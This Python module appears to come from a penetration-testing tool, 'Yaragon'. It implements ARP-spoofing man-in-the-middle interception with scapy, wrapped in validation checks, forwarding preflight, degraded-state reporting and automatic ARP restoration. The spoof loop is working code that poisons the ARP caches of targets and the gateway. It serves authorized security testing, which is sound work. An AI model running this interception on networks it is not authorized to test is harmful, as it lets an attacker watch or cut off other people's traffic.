"""ARP-based MITM controller for authorized security testing.

Yaragon positions this host between one or more *targets* and the *gateway* by
sending ARP replies that map the gateway's IP to Yaragon's MAC (to each target)
and each target's IP to Yaragon's MAC (to the gateway). Traffic is forwarded
transparently so connectivity is preserved while Yaragon observes it.

Intended only for networks the operator is authorized to test. On stop, Yaragon
re-ARPs every endpoint with the correct mappings to restore normal delivery. It
does not read, modify, or exfiltrate application data - it only redirects
layer-2 delivery so the capture engine can see the frames.
"""
from __future__ import annotations

import atexit
import ipaddress
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from ..platform import ForwardingController, get_platform
from ..utils.logging import get_logger
from . import arp as arp_helper
from .interfaces import InterfaceInfo

log = get_logger("mitm")

# After this many consecutive ARP-send rounds fail, the session is reported
# DEGRADED - a security tool must never keep claiming ACTIVE while it has
# silently stopped intercepting.
DEGRADE_THRESHOLD = 3


def degraded_reached(consecutive_failures: int,
                     threshold: int = DEGRADE_THRESHOLD) -> bool:
    """Pure predicate (unit-testable headlessly): has the consecutive-failure
    count crossed the degraded threshold?"""
    return consecutive_failures >= threshold


@dataclass
class ValidationResult:
    ok: bool
    checks: List[tuple] = field(default_factory=list)  # (name, passed, detail)

    def add(self, name: str, passed: bool, detail: str = "") -> None:
        self.checks.append((name, passed, detail))
        if not passed:
            self.ok = False


@dataclass
class MitmSession:
    iface: str
    gateway_ip: str
    gateway_mac: str
    local_mac: str
    started_at: float
    targets: List[Tuple[str, str]] = field(default_factory=list)  # (ip, mac)

    @property
    def target_ips(self) -> List[str]:
        return [ip for ip, _ in self.targets]


def _valid_ip(x: str) -> bool:
    try:
        ipaddress.ip_address(x)
        return True
    except Exception:
        return False


class MitmController:
    def __init__(self, forwarding: Optional[ForwardingController] = None,
                 manage_forwarding: bool = True):
        self.forwarding = forwarding or get_platform().create_forwarding()
        self.manage_forwarding = manage_forwarding
        self._session: Optional[MitmSession] = None
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.RLock()
        # Optional callback fired (on the spoof thread) when a running session
        # degrades. The GUI wires this to a queued Qt signal so it can surface a
        # visible DEGRADED state. Qt-free by design - this is a plain callable.
        self.on_degraded: Optional[Callable[[], None]] = None
        # Optional callback fired (on the spoof thread) if the loop exits
        # unexpectedly and self-heals. The GUI wires this to a queued signal so it
        # can leave the ACTIVE readout - a torn-down session must never keep
        # claiming ACTIVE. Qt-free by design.
        self.on_thread_exit: Optional[Callable[[], None]] = None
        # Whether the most recent teardown restored the network cleanly. A MITM
        # safety tool must never claim "restored" when a restore actually failed,
        # so stop()/self-heal record this and the GUI surfaces it honestly.
        self.last_restore_ok: bool = True
        self.last_restore_error: str = ""
        # Guarantee ARP/forwarding restoration even on abnormal exit so we never
        # leave the LAN poisoned. stop() is idempotent, so this is safe to call
        # unconditionally at interpreter shutdown.
        atexit.register(self.stop)

    @property
    def session(self) -> Optional[MitmSession]:
        return self._session

    @property
    def active(self) -> bool:
        return self._session is not None

    # ---- validation ---------------------------------------------------
    def validate(self, iface: InterfaceInfo, targets: List[str],
                 gateway_ip: str) -> ValidationResult:
        res = ValidationResult(ok=True)
        res.add("Interface up with IPv4",
                bool(iface and iface.ipv4 and iface.is_up),
                iface.name if iface else "no interface")
        res.add("Gateway IP valid", _valid_ip(gateway_ip), gateway_ip)
        res.add("At least one target", len(targets) >= 1, f"{len(targets)} selected")

        bad = [t for t in targets if not _valid_ip(t)]
        res.add("All target IPs valid", not bad, ", ".join(bad) if bad else "")
        res.add("Targets exclude the gateway", gateway_ip not in targets)
        if iface:
            res.add("Targets exclude this host", iface.ipv4 not in targets)

        if iface and iface.cidr and _valid_ip(gateway_ip):
            try:
                net = ipaddress.ip_network(iface.cidr, strict=False)
                off = [t for t in targets if _valid_ip(t)
                       and ipaddress.ip_address(t) not in net]
                res.add("Targets & gateway on interface subnet",
                        not off and ipaddress.ip_address(gateway_ip) in net,
                        str(net))
            except Exception:
                res.add("Targets & gateway on interface subnet", False)
        return res

    def reachability(self, iface: InterfaceInfo, targets: List[str],
                     gateway_ip: str) -> ValidationResult:
        """Active ARP reachability probe (needs raw-socket privileges)."""
        res = ValidationResult(ok=True)
        gmac = arp_helper.resolve_mac(gateway_ip, iface.name)
        res.add("Gateway reachable (ARP)", bool(gmac), gmac or "no reply")
        reached = 0
        for t in targets:
            if arp_helper.resolve_mac(t, iface.name):
                reached += 1
        res.add("Targets reachable (ARP)", reached == len(targets) and reached > 0,
                f"{reached}/{len(targets)}")
        return res

    # ---- lifecycle ----------------------------------------------------
    def start(self, iface: InterfaceInfo, targets: List[str], gateway_ip: str,
              gateway_mac: Optional[str] = None,
              reassert_interval: float = 2.0) -> MitmSession:
        # start() is the real security boundary - it emits forged ARP. Re-run the
        # static invariants here (not only in validate()) so the dangerous
        # primitive is safe by construction: any caller that reaches start()
        # without a prior validate() still cannot poison the gateway, this host,
        # an off-subnet address, or a malformed target.
        res = self.validate(iface, targets, gateway_ip)
        if not res.ok:
            failed = [n for n, p, _ in res.checks if not p]
            raise ValueError(
                "Refusing to start MITM - invalid target set: " + "; ".join(failed))

        # Fail closed if the host will not actually relay the forwarded traffic.
        # ip_forward=1 alone is not enough: a netfilter FORWARD policy of DROP
        # (ufw / firewalld / a Docker host) would black-hole the target. Refuse
        # BEFORE any ARP is resolved or sent, rather than create a broken
        # interception state the operator can't see.
        if self.manage_forwarding:
            pre = self.forwarding.preflight(iface.name)
            if pre.blocked:
                raise RuntimeError("Refusing to start MITM - " + pre.reason)

        # Blocking ARP resolution happens BEFORE taking the lock (start() runs on
        # a worker thread), so we never hold the lock across multi-second probes
        # and block a concurrent stop().
        gmac = gateway_mac or arp_helper.resolve_mac(gateway_ip, iface.name)
        if not gmac:
            raise RuntimeError(
                "Could not resolve the gateway MAC. Ensure the gateway is "
                "reachable and Yaragon has raw-socket privileges.")

        resolved: List[Tuple[str, str]] = []
        for t in targets:
            mac = arp_helper.resolve_mac(t, iface.name)
            if mac:
                resolved.append((t, mac))
            else:
                log.warning("Skipping unreachable target %s", t)
        if not resolved:
            raise RuntimeError("None of the selected targets could be resolved.")

        with self._lock:
            if self.active:
                raise RuntimeError("MITM already active")

            if self.manage_forwarding and not self.forwarding.enable():
                # Without IP forwarding the spoof would black-hole the victim's
                # traffic (a DoS) instead of relaying it transparently. Refuse to
                # start rather than disrupt the target.
                self.forwarding.restore()
                raise RuntimeError(
                    "Could not enable IP forwarding (the one-time privilege "
                    "prompt was declined or unavailable). Refusing to start MITM "
                    "- it would cut the target off instead of relaying its traffic.")

            session = MitmSession(
                iface=iface.name, gateway_ip=gateway_ip, gateway_mac=gmac,
                local_mac=iface.mac, started_at=time.time(), targets=resolved,
            )
            self._session = session
            self._stop.clear()
            self._thread = threading.Thread(
                target=self._spoof_loop, args=(session, reassert_interval),
                name="yaragon-mitm", daemon=True)
            self._thread.start()
            log.info("MITM started: %d target(s) via gateway %s(%s)",
                     len(resolved), gateway_ip, gmac)
            return session

    def _spoof_loop(self, s: MitmSession, interval: float) -> None:
        from scapy.all import ARP, send

        consecutive_failures = 0
        degraded = False
        try:
            while not self._stop.is_set():
                round_failed = False
                for tip, tmac in s.targets:
                    try:
                        # Tell the target that the gateway is at our MAC
                        send(ARP(op=2, pdst=tip, hwdst=tmac,
                                 psrc=s.gateway_ip, hwsrc=s.local_mac),
                             iface=s.iface, verbose=0)
                        # Tell the gateway that the target is at our MAC
                        send(ARP(op=2, pdst=s.gateway_ip, hwdst=s.gateway_mac,
                                 psrc=tip, hwsrc=s.local_mac),
                             iface=s.iface, verbose=0)
                    except Exception as exc:
                        round_failed = True
                        log.debug("spoof send failed for %s: %s", tip, exc)
                # Track consecutive failing rounds; a clean round recovers.
                if round_failed:
                    consecutive_failures += 1
                else:
                    consecutive_failures = 0
                    degraded = False
                if (not degraded and self.on_degraded
                        and degraded_reached(consecutive_failures)):
                    degraded = True
                    log.warning("MITM session degraded: %d consecutive failed "
                                "ARP rounds", consecutive_failures)
                    try:
                        self.on_degraded()
                    except Exception as exc:
                        log.debug("degraded callback failed: %s", exc)
                self._stop.wait(interval)
        except Exception as exc:
            # An unexpected error (e.g. the interface vanished) must not crash the
            # thread silently and leave the LAN poisoned - fall through to the
            # self-heal in finally, which also notifies the GUI.
            log.warning("Spoof loop crashed: %s", exc)
        finally:
            # If the loop exits for any reason other than an explicit stop()
            # (e.g. an unexpected error in the thread), heal the network so we
            # never leave the victims pointing at us.
            # Not locked: a concurrent stop() holds the lock across join(), so
            # taking it here could stall. The assignment below is a single
            # rebind and stop() is idempotent, so this is safe.
            if not self._stop.is_set():
                log.warning("Spoof loop exited unexpectedly - restoring ARP")
                restore_ok = True
                fwd_result = None
                try:
                    restore_ok = self._restore(s)
                    if self.manage_forwarding:
                        fwd_result = self.forwarding.restore()
                finally:
                    if self._session is s:
                        self._session = None
                    self._record_restore(restore_ok, fwd_result)
                    # Tell the GUI the session is gone so the readout leaves
                    # ACTIVE. Fired only on the UNEXPECTED path - a clean stop()
                    # updates the GUI through its own worker.
                    if self.on_thread_exit is not None:
                        try:
                            self.on_thread_exit()
                        except Exception as cb_exc:
                            log.debug("thread-exit callback failed: %s", cb_exc)

    def stop(self) -> None:
        with self._lock:
            if not self.active:
                return
            s = self._session
            self._stop.set()
            if self._thread is not None:
                self._thread.join(timeout=5)
                self._thread = None
            restore_ok = self._restore(s)
            fwd_result = self.forwarding.restore() if self.manage_forwarding else None
            self._session = None
            self._record_restore(restore_ok, fwd_result)
            if self.last_restore_ok:
                log.info("MITM stopped and ARP state restored")
            else:
                log.warning("MITM stopped but network restore reported errors")

    def _restore(self, s: MitmSession, rounds: int = 5) -> bool:
        """Re-ARP every endpoint with the correct mappings to heal the network.

        Returns True only if every restore frame was sent without error. A
        failure is never swallowed as success - the caller reports it so the
        operator is never told "restored" when the LAN may still be poisoned.
        Each send is guarded individually so one failure does not abort healing
        the remaining endpoints."""
        try:
            from scapy.all import ARP, send
        except Exception as exc:
            log.warning("ARP restore could not import scapy: %s", exc)
            return False
        ok = True
        for _ in range(rounds):
            for tip, tmac in s.targets:
                try:
                    send(ARP(op=2, pdst=tip, hwdst=tmac,
                             psrc=s.gateway_ip, hwsrc=s.gateway_mac),
                         iface=s.iface, verbose=0, count=1)
                except Exception as exc:
                    ok = False
                    log.warning("ARP restore (target %s) failed: %s", tip, exc)
                try:
                    send(ARP(op=2, pdst=s.gateway_ip, hwdst=s.gateway_mac,
                             psrc=tip, hwsrc=tmac),
                         iface=s.iface, verbose=0, count=1)
                except Exception as exc:
                    ok = False
                    log.warning("ARP restore (gateway for %s) failed: %s", tip, exc)
            time.sleep(0.2)
        return ok

    _RESTORE_FAIL_MSG = (
        "ARP or IP-forwarding restore did not complete cleanly - the target's "
        "ARP cache may still point at this host. Verify the target and re-run "
        "then stop MITM to re-assert the correct mappings.")

    def _record_restore(self, restore_ok: bool, fwd_result) -> None:
        """Fold the ARP-restore and forwarding-restore outcomes into the honest
        last_restore_ok/error the GUI reads (forwarding controllers may return
        None for 'no-op/unknown', treated as success)."""
        fwd_ok = True if fwd_result is None else bool(fwd_result)
        self.last_restore_ok = bool(restore_ok and fwd_ok)
        self.last_restore_error = "" if self.last_restore_ok else self._RESTORE_FAIL_MSG
